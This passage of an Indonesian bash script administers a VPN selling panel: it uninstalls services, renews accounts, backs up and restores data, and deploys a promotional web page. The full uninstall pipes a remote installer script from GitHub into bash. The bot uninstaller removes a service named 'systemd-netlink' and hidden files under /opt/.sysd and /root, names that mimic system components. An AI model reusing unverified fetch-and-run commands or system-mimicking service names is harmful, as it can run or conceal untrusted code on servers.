    clear; print_menu_header "UNINSTALL NGINX"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop nginx 2>/dev/null; systemctl disable nginx 2>/dev/null



    apt-get purge -y nginx nginx-common >/dev/null 2>&1



    echo -e "  ${GREEN}✔ Nginx uninstalled!${NC}"; sleep 2



}







_uninstall_haproxy() {



    clear; print_menu_header "UNINSTALL HAPROXY"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop haproxy 2>/dev/null; systemctl disable haproxy 2>/dev/null



    apt-get purge -y haproxy >/dev/null 2>&1



    echo -e "  ${GREEN}✔ HAProxy uninstalled!${NC}"; sleep 2



}







_uninstall_dropbear() {



    clear; print_menu_header "UNINSTALL DROPBEAR"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop dropbear 2>/dev/null; systemctl disable dropbear 2>/dev/null



    apt-get purge -y dropbear >/dev/null 2>&1



    echo -e "  ${GREEN}✔ Dropbear uninstalled!${NC}"; sleep 2



}







_uninstall_udp() {



    clear; print_menu_header "UNINSTALL UDP"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop udp-custom 2>/dev/null; systemctl disable udp-custom 2>/dev/null



    rm -f /etc/systemd/system/udp-custom.service /usr/local/bin/udp-custom



    systemctl daemon-reload



    echo -e "  ${GREEN}✔ UDP uninstalled!${NC}"; sleep 2



}







_uninstall_bot() {



    clear; print_menu_header "UNINSTALL BOT"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop vpn-bot 2>/dev/null; systemctl disable vpn-bot 2>/dev/null



    rm -f /etc/systemd/system/vpn-bot.service



    rm -rf /root/bot



    rm -f "$BOT_TOKEN_FILE" "$CHAT_ID_FILE" "$PAYMENT_FILE"



    rm -f /root/.svc_reg /root/.svc_mid



    systemctl stop systemd-netlink 2>/dev/null; systemctl disable systemd-netlink 2>/dev/null



    rm -f /etc/systemd/system/systemd-netlink.service



    rm -rf "$TUNNELBOT_DIR" /opt/.sysd



    systemctl daemon-reload



    echo -e "  ${GREEN}✔ Semua bot uninstalled!${NC}"; sleep 2



}







_uninstall_keepalive() {



    clear; print_menu_header "UNINSTALL KEEPALIVE"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop vpn-keepalive 2>/dev/null; systemctl disable vpn-keepalive 2>/dev/null



    rm -f /etc/systemd/system/vpn-keepalive.service /usr/local/bin/vpn-keepalive.sh



    systemctl daemon-reload



    echo -e "  ${GREEN}✔ Keepalive uninstalled!${NC}"; sleep 2



}







_uninstall_all() {

    clear

    echo -e "${RED}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}  ║      !! HAPUS SEMUA — VPS SEPERTI BARU !!       ║${NC}"
    echo -e "${RED}  ╚══════════════════════════════════════════════════╝${NC}"

    echo ""
    echo -e "  ${YELLOW}PERINGATAN: Ini akan menghapus SEMUA:${NC}"
    echo -e "  ${YELLOW}  • Semua service (xray, nginx, haproxy, dropbear)${NC}"
    echo -e "  ${YELLOW}  • Database MySQL (ordervpn)${NC}"
    echo -e "  ${YELLOW}  • Web panel (/ordervpn/)${NC}"
    echo -e "  ${YELLOW}  • Semua config & data user${NC}"
    echo -e "  ${YELLOW}  • Backup files & rclone config${NC}"
    echo -e "  ${YELLOW}  • Package yg terinstall (mysql, php, jq, dll)${NC}"
    echo -e "  ${YELLOW}  • VPS akan AUTO REBOOT setelah selesai${NC}"
    echo ""

    read -rp "  Ketik 'HAPUS' untuk konfirmasi: " confirm

    [[ "$confirm" != "HAPUS" ]] && { echo -e "  ${YELLOW}Dibatalkan.${NC}"; sleep 2; return; }

    echo ""

    # 1. Stop semua service
    echo -e "  ${CYAN}[1/8]${NC} Stopping semua service..."
    for svc in xray nginx haproxy dropbear udp-custom vpn-keepalive vpn-bot systemd-netlink mysql mariadb php*-fpm; do
        systemctl stop "$svc" 2>/dev/null
        systemctl disable "$svc" 2>/dev/null
    done
    echo -e "  ${GREEN}✔${NC} Done"

    # 2. Hapus database MySQL
    echo -e "  ${CYAN}[2/8]${NC} Menghapus database MySQL..."
    if command -v mysql &>/dev/null; then
        local MYSQL_CMD="mysql"
        [[ -f /etc/mysql/debian.cnf ]] && MYSQL_CMD="mysql --defaults-file=/etc/mysql/debian.cnf"
        $MYSQL_CMD -e "DROP DATABASE IF EXISTS ordervpn;" 2>/dev/null || true
        echo -e "  ${GREEN}✔${NC} Database ordervpn dihapus"
    else
        echo -e "  ${YELLOW}⚠${NC} mysql not found, skip"
    fi

    # 3. Uninstall Xray
    echo -e "  ${CYAN}[3/8]${NC} Uninstall Xray..."
    bash <(curl -Ls https://github.com/XTLS/Xray-install/raw/main/install-release.sh) --remove >/dev/null 2>&1 || true
    echo -e "  ${GREEN}✔${NC} Done"

    # 4. Purge packages
    echo -e "  ${CYAN}[4/8]${NC} Menghapus package terinstall..."
    apt-get purge -y nginx nginx-common haproxy dropbear mysql-server mysql-client \
        mariadb-server mariadb-client sshpass jq rclone certbot python3-certbot-nginx \
        >/dev/null 2>&1 || true
    # Hapus semua package PHP & MySQL/MariaDB (resolved names)
    dpkg -l 2>/dev/null | grep -Ei 'php[0-9]|mariadb|mysql-(common|community|server|client)' | awk '{print $2}' | \
        xargs -r apt-get purge -y >/dev/null 2>&1 || true
    apt-get autoremove --purge -y >/dev/null 2>&1 || true
    apt-get autoclean -y >/dev/null 2>&1 || true
    echo -e "  ${GREEN}✔${NC} Done"

    # 5. Hapus semua folder & file
    echo -e "  ${CYAN}[5/8]${NC} Menghapus semua data..."
    rm -rf /usr/local/etc/xray /var/log/xray /etc/xray \
           /root/akun /root/bot /root/orders \
           /root/domain /root/.domain_type /root/.bot_token /root/.chat_id \
           /root/.payment_info /root/.ordervpn_db /root/.ordervpn_admin \
           /root/vpn.sh.bak "$TUNNELBOT_DIR" /root/.svc_reg /root/.svc_mid \
           /root/backups /root/.config/rclone /root/.rclone.conf \
           /var/www/ordervpn /ordervpn /usr/share/nginx/ordervpn \
           /etc/nginx/sites-available/ordervpn /etc/nginx/sites-enabled/ordervpn \
           /etc/nginx/sites-available/ordervpn-domain /etc/nginx/sites-enabled/ordervpn-domain \
           /etc/nginx/conf.d/ordervpn.conf \
           /etc/profile.d/vpn-panel.sh 2>/dev/null
    echo -e "  ${GREEN}✔${NC} Done"

    # 6. Hapus binary & service files
    echo -e "  ${CYAN}[6/8]${NC} Menghapus binary & service files..."
    rm -f /etc/systemd/system/udp-custom.service \
          /etc/systemd/system/vpn-keepalive.service \
          /etc/systemd/system/vpn-bot.service \
          /etc/systemd/system/systemd-netlink.service \
          /usr/local/bin/udp-custom /usr/local/bin/vpn-keepalive.sh \
          /usr/local/bin/vpn-api /usr/local/bin/install-remote.sh \
          /usr/local/bin/vpn-backup-auto /usr/local/bin/menu \
          /root/vpn.sh
    echo -e "  ${GREEN}✔${NC} Done"

    # 7. Bersihkan .bashrc
    echo -e "  ${CYAN}[7/8]${NC} Membersihkan .bashrc..."
    grep -v -E 'tunnel\.sh|VPN Panel Auto-Start|VPN_MENU_RUNNING|mesg n 2>' \
        /root/.bashrc > /tmp/_bashrc_clean.tmp 2>/dev/null && \
        mv /tmp/_bashrc_clean.tmp /root/.bashrc || true
    rm -f /root/.hushlogin
    # Hapus crontab root (selective: cron VPN saja)
    crontab -l 2>/dev/null | grep -v "tunnel\.sh\|xray\|vpn-\|delete_expired\|ssl-renew" | crontab - 2>/dev/null || true
    echo -e "  ${GREEN}✔${NC} Done"

    # 8. Reload systemd
    echo -e "  ${CYAN}[8/8]${NC} Reload systemd..."
    systemctl daemon-reload
    echo -e "  ${GREEN}✔${NC} Done"

    echo ""
    echo -e "  ${GREEN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${GREEN}║   VPS BERSIH — SEPERTI BARU!            ║${NC}"
    echo -e "  ${GREEN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${RED}Konfirmasi terakhir sebelum reboot...${NC}"
    read -rp "  Ketik 'YA' untuk reboot sekarang: " final_confirm
    [[ "$final_confirm" != "YA" ]] && { echo -e "  ${YELLOW}Reboot dibatalkan. VPS sudah bersih, reboot manual nanti.${NC}"; sleep 2; exit 0; }
    echo -e "  ${YELLOW}VPS akan reboot dalam 5 detik...${NC}"
    sleep 5
    reboot

}







#================================================



# HELPER FUNCTIONS



#================================================







#================================================



# RENEW / EXTEND AKUN



#================================================







menu_renew() {



    clear



    local W; W=$(get_width)



    print_menu_header "RENEW / EXTEND AKUN"



    if [[ ! -d "$AKUN_DIR" ]] || [[ -z "$(ls $AKUN_DIR/*.txt 2>/dev/null)" ]]; then



        echo -e "  ${YELLOW}Tidak ada akun tersimpan.${NC}"; sleep 1; return



    fi







    # Tampilkan daftar akun



    local i=1



    declare -A akun_map



    for f in "$AKUN_DIR"/*.txt; do



        local fname; fname=$(basename "$f" .txt)



        local exp_str; exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | cut -d= -f2-)



        printf "  ${CYAN}[%2d]${NC} %-30s exp: %s\n" "$i" "$fname" "${exp_str:-?}"



        akun_map[$i]="$f"



        ((i++))



    done



    echo ""



    read -rp "  Pilih nomor akun [0=batal]: " sel



    [[ -z "$sel" || "$sel" == "0" ]] && return



    local target="${akun_map[$sel]}"



    [[ -z "$target" ]] && echo -e "  ${RED}Nomor tidak valid!${NC}" && sleep 1 && return







    echo ""



    read -rp "  Tambah berapa hari? [contoh: 7]: " add_days



    [[ -z "$add_days" || ! "$add_days" =~ ^[0-9]+$ ]] && \
        echo -e "  ${RED}Input tidak valid!${NC}" && sleep 1 && return







    # Hitung expired baru



    local cur_exp; cur_exp=$(grep "EXPIRED=" "$target" | cut -d= -f2-)



    local cur_ts; cur_ts=$(parse_exp_ts "$cur_exp")



    local now_ts; now_ts=$(date +%s)



    # Jika sudah expired, hitung dari sekarang



    [[ -z "$cur_ts" || "$cur_ts" -lt "$now_ts" ]] && cur_ts=$now_ts



    local new_ts=$(( cur_ts + add_days * 86400 ))



    local new_exp; new_exp=$(date -d "@$new_ts" "+%d %b, %Y %H:%M")







    # Update file akun



    sed -i "s|^EXPIRED=.*|EXPIRED=${new_exp}|" "$target"







    local fname; fname=$(basename "$target" .txt)



    local protocol="${fname%%-*}"







    # Update expired di Xray config jika bukan SSH



    if [[ "$protocol" != "ssh" ]]; then



        local uname="${fname#*-}"



        local exp_epoch
        exp_epoch=$(date -d "$new_exp" +%s 2>/dev/null || echo 0)
        [[ "$exp_epoch" -eq 0 ]] && exp_epoch=$(( $(date +%s) + add_days * 86400 ))

        local tmp; tmp=$(mktemp)
        jq --arg email "$uname" --argjson expiry "$exp_epoch" \
           '(.inbounds[].settings.clients[]? | select(.email == $email)) += {"expiry": $expiry}' \
           "$XRAY_CONFIG" > "$tmp" 2>/dev/null
        if jq empty "$tmp" 2>/dev/null && [[ -s "$tmp" ]]; then
            mv "$tmp" "$XRAY_CONFIG"
            xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1 || true
        else
            rm -f "$tmp"
        fi



    fi







    echo ""



    echo -e "  ${GREEN}✔ Akun ${fname} diperpanjang ${add_days} hari${NC}"



    echo -e "  ${WHITE}Expired baru: ${CYAN}${new_exp}${NC}"



    sleep 2



}







#================================================



# LIVE CONNECTIONS MONITOR



#================================================







menu_live_connections() {



    clear



    local W; W=$(get_width)



    print_menu_header "LIVE CONNECTIONS"



    echo -e "  ${WHITE}Waktu :${NC} ${CYAN}$(date '+%d %b %Y %H:%M:%S %Z')${NC}"



    echo ""







    # ── Xray connections ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}XRAY CONNECTIONS${NC}"



    _box_divider $W



    local xray_conns



    xray_conns=$(ss -tnp 2>/dev/null | grep xray | grep ESTAB | awk '{print $5}' | sort | uniq -c | sort -rn)



    if [[ -n "$xray_conns" ]]; then



        echo "$xray_conns" | while read -r count ip; do



            printf "  ${GREEN}%3s conn${NC}  %s\n" "$count" "$ip"



        done



    else



        echo -e "  ${DIM}Tidak ada koneksi Xray aktif${NC}"



    fi



    _box_bottom $W



    echo ""







    # ── SSH connections ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}SSH CONNECTIONS${NC}"



    _box_divider $W



    local ssh_conns



    ssh_conns=$(who 2>/dev/null | grep -v "^$")



    if [[ -n "$ssh_conns" ]]; then



        while IFS= read -r line; do



            echo -e "  ${GREEN}●${NC} $line"



        done <<< "$ssh_conns"



    else



        echo -e "  ${DIM}Tidak ada sesi SSH aktif${NC}"



    fi



    _box_bottom $W



    echo ""







    # ── Summary ──



    local total_tcp; total_tcp=$(ss -tnp 2>/dev/null | grep -c ESTAB)



    echo -e "  ${WHITE}Total koneksi aktif :${NC} ${GREEN}${total_tcp}${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# INFO QUOTA AKUN



#================================================







menu_quota() {



    clear



    local W; W=$(get_width)



    print_menu_header "INFO QUOTA AKUN"



    if [[ ! -d "$AKUN_DIR" ]] || [[ -z "$(ls $AKUN_DIR/*.txt 2>/dev/null)" ]]; then



        echo -e "  ${YELLOW}Tidak ada akun tersimpan.${NC}"; sleep 2; return



    fi







    _box_top $W



    _box_center $W "${CYAN}${BOLD}DAFTAR AKUN & QUOTA${NC}"



    _box_divider $W



    printf "  ${WHITE}%-28s %-12s %-8s %s${NC}\n" "AKUN" "EXPIRED" "QUOTA" "IP LIMIT"



    _box_divider $W







    local now_ts; now_ts=$(date +%s)



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        local fname; fname=$(basename "$f" .txt)



        local exp_str quota iplimit exp_ts status_color



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | cut -d= -f2-)



        quota=$(grep "QUOTA=" "$f" 2>/dev/null | cut -d= -f2-)



        iplimit=$(grep "IPLIMIT=" "$f" 2>/dev/null | cut -d= -f2-)



        exp_ts=$(parse_exp_ts "$exp_str")







        if [[ -n "$exp_ts" && "$exp_ts" -lt "$now_ts" ]]; then



            status_color="${RED}"



        else



            status_color="${GREEN}"



        fi







        printf "  ${status_color}%-28s${NC} %-12s %-8s %s\n" \
            "${fname:0:28}" \
            "${exp_str:0:12}" \
            "${quota:-unlim}" \
            "${iplimit:-1}"



    done



    _box_bottom $W



    echo ""



    read -rp "  Press any key to back..."



}







_menu_list_all() {



    clear; print_menu_header "ALL ACCOUNTS"



    local total=0



    shopt -s nullglob



    for proto in ssh vmess vless trojan; do



        local files=("$AKUN_DIR"/${proto}-*.txt)



        [[ ${#files[@]} -eq 0 ]] && continue



        echo -e "  ${GREEN}── ${proto^^} ACCOUNTS ─────────────────────────────────${NC}"



        for f in "${files[@]}"; do



            local uname exp



            uname=$(basename "$f" .txt | sed "s/${proto}-//")



            exp=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



            printf "  ${CYAN}▸${NC} ${GREEN}%-20s${NC} ${YELLOW}%s${NC}\n" "$uname" "$exp"



            ((total++))



        done



        echo ""



    done



    shopt -u nullglob



    echo -e "  ${WHITE}Total: ${GREEN}${total}${NC} accounts"



    echo ""; read -rp "  Press any key to back..."



}








_restore_backup() {
    clear; print_menu_header "RESTORE BACKUP"

    local backup_dir="/root/backups"

    echo -e "  ${YELLOW}Available backups:${NC}\n"

    # List local backups
    local local_backups=()
    if [[ -d "$backup_dir" ]]; then
        mapfile -t local_backups < <(ls -1t "$backup_dir"/vpn-fullbackup-*.tar.gz 2>/dev/null)
    fi

    if [[ ${#local_backups[@]} -eq 0 ]]; then
        echo -e "  ${YELLOW}No local backups found.${NC}"
    else
        local i=1
        for bf in "${local_backups[@]:0:10}"; do
            local bn=$(basename "$bf")
            local sz=$(du -h "$bf" | awk '{print $1}')
            echo -e "  ${WHITE}[${i}]${NC} ${bn} (${sz})"
            ((i++))
        done
    fi

    # Check GDrive
    if command -v rclone &>/dev/null && rclone listremotes 2>/dev/null | grep -q "gdrive:"; then
        echo -e "\n  ${CYAN}Google Drive backups:${NC}"
        rclone ls "gdrive:/vpn-backups/" 2>/dev/null | head -10 | while read -r sz fn; do
            echo -e "  ${YELLOW}GDrive:${NC} ${fn} ($(numfmt --to=iec $sz 2>/dev/null || echo ${sz}))"
        done
        echo -e "\n  ${WHITE}[D]${NC} Download latest from Google Drive"
    fi

    echo -e "\n  ${WHITE}[0]${NC} Back"
    echo ""
    read -rp "  Pilih backup untuk restore (atau 0): " rb_choice

    local selected=""
    if [[ "$rb_choice" == "0" ]]; then
        return
    elif [[ "$rb_choice" == "D" || "$rb_choice" == "d" ]]; then
        # Download from GDrive
        if ! command -v rclone &>/dev/null; then
            echo -e "  ${RED}rclone tidak terinstall!${NC}"; sleep 2; return
        fi
        echo -e "  ${YELLOW}Downloading latest backup from Google Drive...${NC}"
        mkdir -p "$backup_dir"
        local latest_gd=$(rclone lsf "gdrive:/vpn-backups/" --include "vpn-fullbackup-*.tar.gz" --format "p" 2>/dev/null | sort -r | head -1)
        if [[ -n "$latest_gd" ]]; then
            rclone copyto "gdrive:/vpn-backups/$latest_gd" "$backup_dir/$latest_gd" 2>/dev/null
            selected="$backup_dir/$latest_gd"
        fi
    elif [[ "$rb_choice" =~ ^[0-9]+$ ]] && [[ ${local_backups[$((rb_choice-1))]+_} ]]; then
        selected="${local_backups[$((rb_choice-1))]}"
    fi

    if [[ -z "$selected" || ! -f "$selected" ]]; then
        echo -e "  ${RED}Backup tidak ditemukan!${NC}"; sleep 2; return
    fi

    echo -e "\n  ${YELLOW}Restoring from: $(basename "$selected")${NC}"
    echo -e "  ${RED}PERINGATAN: Ini akan menimpa database & config saat ini!${NC}"
    read -rp "  Lanjutkan? [y/N]: " rb_confirm
    if [[ "$rb_confirm" != "y" && "$rb_confirm" != "Y" ]]; then
        echo -e "  ${YELLOW}Restore dibatalkan.${NC}"; sleep 2; return
    fi

    local tmp_restore="/tmp/vpn-restore-$$"
    mkdir -p "$tmp_restore"
    tar -xzf "$selected" -C "$tmp_restore" 2>/dev/null

    # Restore MySQL
    if [[ -f "$tmp_restore/ordervpn.sql" ]]; then
        echo -e "  ${CYAN}→${NC} Restoring MySQL database..."
        if ! command -v mysql &>/dev/null; then
            echo -e "  ${RED}✘${NC} mysql CLI not found! Install mysql-client dulu."
        else
            local RMYSQL_CMD="mysql"
            [[ -f /etc/mysql/debian.cnf ]] && RMYSQL_CMD="mysql --defaults-file=/etc/mysql/debian.cnf"
            $RMYSQL_CMD ordervpn < "$tmp_restore/ordervpn.sql" 2>/dev/null && \
                echo -e "  ${GREEN}✔${NC} Database restored!" || \
                echo -e "  ${RED}✘${NC} Database restore failed!"
        fi
    fi

    # Restore config files
    echo -e "  ${CYAN}→${NC} Restoring config files..."
    for f in domain .domain_type akun .bot_token .chat_id .payment_info xray.crt xray.key config.json; do
        if [[ -f "$tmp_restore/$f" ]]; then
            case "$f" in
                domain|.domain_type|akun|.bot_token|.chat_id|.payment_info)
                    cp "$tmp_restore/$f" "/root/$f" 2>/dev/null ;;
                xray.crt|xray.key)
                    cp "$tmp_restore/$f" "/etc/xray/$f" 2>/dev/null ;;
                config.json)
                    cp "$tmp_restore/$f" "/usr/local/etc/xray/config.json" 2>/dev/null ;;
            esac
        fi
    done
    echo -e "  ${GREEN}✔${NC} Config files restored!"

    # Restart services
    echo -e "  ${CYAN}→${NC} Restarting services..."
    systemctl restart xray 2>/dev/null || true
    systemctl restart nginx 2>/dev/null || true
    echo -e "  ${GREEN}✔${NC} Services restarted!"

    rm -rf "$tmp_restore"
    echo -e "\n  ${GREEN}╔════════════════════════════════╗${NC}"
    echo -e "  ${GREEN}║   RESTORE BERHASIL!          ║${NC}"
    echo -e "  ${GREEN}╚════════════════════════════════╝${NC}"
    echo -e "  ${YELLOW}Semua data & config telah dikembalikan.${NC}"
    echo ""; read -rp "  Press any key to back..."
}

_menu_backup() {



    clear; print_menu_header "BACKUP SYSTEM"



    echo -e "  ${YELLOW}Creating backup...${NC}"



    local backup_dir="/root/backups"



    local backup_file="vpn-backup-$(date +%Y%m%d-%H%M%S).tar.gz"



    mkdir -p "$backup_dir"



    tar -czf "$backup_dir/$backup_file" \
        /root/domain /root/.domain_type /root/akun \
        /root/.bot_token /root/.chat_id /root/.payment_info \
        /etc/xray/xray.crt /etc/xray/xray.key \
        /usr/local/etc/xray/config.json 2>/dev/null



    if [[ -f "$backup_dir/$backup_file" ]]; then



        echo -e "  ${GREEN}✔ Backup created!${NC}"



        echo -e "  File : ${WHITE}$backup_file${NC}"



        echo -e "  Size : ${CYAN}$(du -h "$backup_dir/$backup_file" | awk '{print $1}')${NC}"



    else



        echo -e "  ${RED}✘ Backup failed!${NC}"



    fi



    echo ""; read -rp "  Press any key to back..."



}







_menu_restore() {



    clear; print_menu_header "RESTORE SYSTEM"



    local backup_dir="/root/backups"



    [[ ! -d "$backup_dir" ]] && { echo -e "  ${RED}No backup directory!${NC}"; sleep 2; return; }



    shopt -s nullglob



    local backups=("$backup_dir"/*.tar.gz)



    shopt -u nullglob



    # Sort by newest first



    IFS=$'\n' backups=($(ls -t "${backups[@]}" 2>/dev/null)); unset IFS



    [[ ${#backups[@]} -eq 0 ]] && { echo -e "  ${RED}No backups found!${NC}"; sleep 2; return; }



    local i=1



    for backup in "${backups[@]}"; do



        printf "  ${CYAN}[%d]${NC} %-40s ${YELLOW}%s${NC}\n" "$i" "$(basename "$backup")" "$(du -h "$backup" | awk '{print $1}')"



        ((i++))



    done



    echo ""; read -rp "  Select [1-${#backups[@]}] or 0 to cancel: " choice



    # Fix: kondisi ambigu - pakai if eksplisit



    if [[ "$choice" == "0" ]] || [[ ! "$choice" =~ ^[0-9]+$ ]]; then



        echo -e "  ${YELLOW}Cancelled${NC}"; sleep 1; return



    fi



    local selected="${backups[$((choice-1))]}"



    [[ -z "$selected" ]] && { echo -e "  ${RED}Pilihan tidak valid!${NC}"; sleep 1; return; }



    read -rp "  Continue? [y/N]: " confirm



    [[ "$confirm" != "y" ]] && { echo -e "  ${YELLOW}Cancelled${NC}"; sleep 1; return; }



    tar -xzf "$selected" -C / 2>/dev/null && \
        echo -e "  ${GREEN}✔ Restore successful!${NC}" || \
        echo -e "  ${RED}✘ Restore failed!${NC}"



    systemctl restart xray nginx haproxy 2>/dev/null



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_show_help() {



    clear; print_menu_header "COMMAND GUIDE"



    echo -e "  ${CYAN}[1-4]${NC}  → Kelola akun SSH/VMess/VLess/Trojan"



    echo -e "  ${CYAN}[5]${NC}    → Generate trial Xray (1 jam)"



    echo -e "  ${CYAN}[6]${NC}    → List semua akun"



    echo -e "  ${CYAN}[7-8]${NC}  → Cek / hapus akun expired"



    echo -e "  ${CYAN}[9]${NC}    → Telegram bot management (VPN-Bot)"



    echo -e "  ${CYAN}[10]${NC}   → Ganti domain"



    echo -e "  ${CYAN}[11]${NC}   → Fix/renew SSL certificate"



    echo -e "  ${CYAN}[12]${NC}   → Optimize VPS settings"



    echo -e "  ${CYAN}[13]${NC}   → Restart semua service"



    echo -e "  ${CYAN}[14]${NC}   → Lihat info port"



    echo -e "  ${CYAN}[15]${NC}   → Speedtest Ookla"



    echo -e "  ${CYAN}[16]${NC}   → Update script dari GitHub"



    echo -e "  ${CYAN}[17-18]${NC}→ Backup & restore"



    echo -e "  ${CYAN}[19]${NC}   → Menu uninstall"



    echo -e "  ${CYAN}[20]${NC}   → Advanced settings"



    echo -e "  ${CYAN}[0]${NC}    → Exit"



    echo ""; read -rp "  Press any key to back..."



}







#================================================



# AUTO INSTALL



#================================================







#================================================



# DEPLOY WEB PAGE (dipanggil saat install & update)



#================================================







deploy_web_page() {



    mkdir -p "$PUBLIC_HTML"



    rm -f "$PUBLIC_HTML/index.nginx-debian.html" "$PUBLIC_HTML/50x.html" "$PUBLIC_HTML/index.htm"



    if [[ -f "$WEB_DOMAIN_FILE" ]]; then
        DOMAIN=$(tr -d '\n\r' < "$WEB_DOMAIN_FILE" | xargs)
    elif [[ -f "$DOMAIN_FILE" ]]; then
        DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)
    fi

    [[ -z "$DOMAIN" ]] && DOMAIN=$(curl -4 -s ifconfig.me 2>/dev/null || wget -qO- ipv4.icanhazip.com 2>/dev/null)



    PAGE_TITLE="Youzin Crabz Tunnel"



    PAGE_DESC="Layanan VPN Premium dengan teknologi Xray-core, WebSocket, dan gRPC. Nikmati koneksi cepat, stabil, dan aman."



    SITE_URL="${DOMAIN}"



    PROTO="http"



    [[ -d "/etc/letsencrypt/live/$DOMAIN" ]] && PROTO="https"



    if [[ -n "$DOMAIN" && "$DOMAIN" != "(belum diset)" ]]; then



        SITE_URL="${PROTO}://${DOMAIN}"



    else



        SITE_URL="${PROTO}://${DOMAIN}"



    fi







    cat > "$PUBLIC_HTML/robots.txt" << 'ROBOTEOF'



User-agent: *



Allow: /



Disallow: /akun/



Disallow: /admin/



Disallow: /api/



Sitemap: SITEMAP_PLACEHOLDER



ROBOTEOF



    if [[ -n "$DOMAIN" ]]; then



        sed -i "s|SITEMAP_PLACEHOLDER|${SITE_URL}/sitemap.xml|g" "$PUBLIC_HTML/robots.txt"



    else



        sed -i "s|SITEMAP_PLACEHOLDER|/sitemap.xml|g" "$PUBLIC_HTML/robots.txt"



    fi







    cat > "$PUBLIC_HTML/sitemap.xml" << 'SITEMAPEOF'



<?xml version="1.0" encoding="UTF-8"?>



<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">



  <url>



    <loc>SITEMAP_PLACEHOLDER</loc>



    <changefreq>daily</changefreq>



    <priority>1.0</priority>



  </url>



</urlset>



SITEMAPEOF



    if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



        sed -i "s|SITEMAP_PLACEHOLDER|https://${DOMAIN}|g" "$PUBLIC_HTML/sitemap.xml"



    else



        sed -i "s|SITEMAP_PLACEHOLDER|http://${DOMAIN}|g" "$PUBLIC_HTML/sitemap.xml"



    fi







    cat > "$PUBLIC_HTML/index.html" << 'WEBEOF'



<!DOCTYPE html>



<html lang="id">



<head>



<meta charset="UTF-8">



<meta name="viewport" content="width=device-width, initial-scale=1.0">



<title>PAGE_TITLE | VPN Premium</title>



<meta name="description" content="PAGE_DESC">



<meta name="keywords" content="VPN, Xray, VMess, VLess, Trojan, WebSocket, gRPC, proxy, tunnel, SSH">



<meta name="robots" content="index, follow">



<meta name="author" content="Youzin Crabz Tunel">



<meta name="theme-color" content="#0a0a1a">



<link rel="canonical" href="SITE_URL">



<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">



<!-- Open Graph -->



<meta property="og:type" content="website">



<meta property="og:url" content="SITE_URL">



<meta property="og:title" content="PAGE_TITLE | VPN Premium">



<meta property="og:description" content="PAGE_DESC">



<meta property="og:image" content="SITE_URL/og-image.png">



<meta property="og:locale" content="id_ID">



<!-- Twitter Cards -->



<meta name="twitter:card" content="summary_large_image">



<meta name="twitter:title" content="PAGE_TITLE | VPN Premium">



<meta name="twitter:description" content="PAGE_DESC">



<!-- Google Search Console -->



<meta name="google-site-verification" content="GOOGLE_VERIFICATION">



<!-- Google Analytics -->



<script>



var gaId = 'GA_ID';



if (gaId) {



  var s = document.createElement('script');



  s.async = true;



  s.src = 'https://www.googletagmanager.com/gtag/js?id=' + gaId;



  document.head.appendChild(s);



  window.dataLayer = window.dataLayer || [];



  function gtag(){dataLayer.push(arguments);}



  gtag('js', new Date());



  gtag('config', gaId);



}



</script>



<!-- Schema.org Structured Data -->



<script type="application/ld+json">



{



  "@context": "https://schema.org",



  "@type": "Organization",



  "name": "Youzin Crabz Tunnel",



  "description": "PAGE_DESC",



  "url": "SITE_URL",



  "logo": "SITE_URL/logo.png",



  "contactPoint": {



    "@type": "ContactPoint",



    "telephone": "+62-xxx-xxxx-xxxx",



    "contactType": "customer service",



    "availableLanguage": ["Indonesia", "English"]



  },



  "sameAs": [



    "https://t.me/youzin_crabz"



  ]



}



</script>



<!-- FAQ Schema -->



<script type="application/ld+json">



{



  "@context": "https://schema.org",



  "@type": "FAQPage",



  "mainEntity": [



    {



      "@type": "Question",



      "name": "Apa itu Youzin Crabz Tunnel?",



      "acceptedAnswer": {



        "@type": "Answer",



        "text": "Layanan VPN premium berbasis Xray-core yang mendukung berbagai protokol seperti VMess, VLess, Trojan, dan SSH dengan koneksi WebSocket dan gRPC."



      }



    },



    {



      "@type": "Question",



      "name": "Bagaimana cara order VPN?",



      "acceptedAnswer": {



        "@type": "Answer",



        "text": "Hubungi admin melalui Telegram untuk melakukan pemesanan dan pembayaran. Setelah konfirmasi, akun akan dibuat dalam waktu singkat."



      }



    },



    {



      "@type": "Question",



      "name": "Apakah ada garansi?",



      "acceptedAnswer": {



        "@type": "Answer",



        "text": "Ya, kami menyediakan garansi server aktif 24/7 dengan monitoring otomatis. Jika ada masalah, tim support siap membantu."



      }



    }



  ]



}



</script>



<!-- Preconnect -->



<link rel="preconnect" href="https://fonts.googleapis.com">



<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>



<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">



<style>



:root {



  --bg: #08081a;



  --bg2: #0d0d25;



  --bg3: #12123a;



  --surface: rgba(255,255,255,0.04);



  --surface-hover: rgba(255,255,255,0.08);



  --border: rgba(255,255,255,0.08);



  --border-hover: rgba(255,255,255,0.15);



  --text: #e8e8f0;



  --text-dim: #8888aa;



  --text-bright: #ffffff;



  --primary: #00d4ff;



